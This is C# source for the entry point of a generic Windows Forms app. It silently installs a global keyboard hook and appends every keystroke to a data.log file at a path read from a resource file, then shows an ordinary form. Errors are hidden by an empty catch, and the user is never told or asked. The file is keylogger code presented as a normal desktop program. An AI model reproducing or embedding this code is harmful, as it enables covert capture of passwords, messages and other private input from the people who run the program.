using Keystroke.API;
using System;
using System.Collections;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Resources;
using System.Threading.Tasks;
using System.Windows.Forms;
using WindowsFormsApp1.Properties;

namespace WindowsFormsApp1
{
    internal static class Program
    {
        /// <summary>
        /// The main entry point for the application.
        /// </summary>
        [STAThread]
        static void Main()
        {
            Application.EnableVisualStyles();
            Application.SetCompatibleTextRenderingDefault(false);
            try
            {
                using (var api = new KeystrokeAPI())
                {
                    string resxFile = @".\Resources.resx";
                    using (ResXResourceReader resxReader = new ResXResourceReader(resxFile))
                    {
                        foreach (DictionaryEntry item in resxReader)
                        {
                            if (item.Key.ToString() == "LogLocation")
                            {
                                string logPath = Path.Combine(item.Value.ToString(), "data.log");
                                
                                    api.CreateKeyboardHook((character) => {
                                        using (StreamWriter sw = File.AppendText(logPath))
                                        {
                                            sw.Write(character);
                                        }
                                    });
                                
                            }
                        }
                    }
                }
            }
            catch
            {

            }
            Application.Run(new Form1());
        }
    }
}
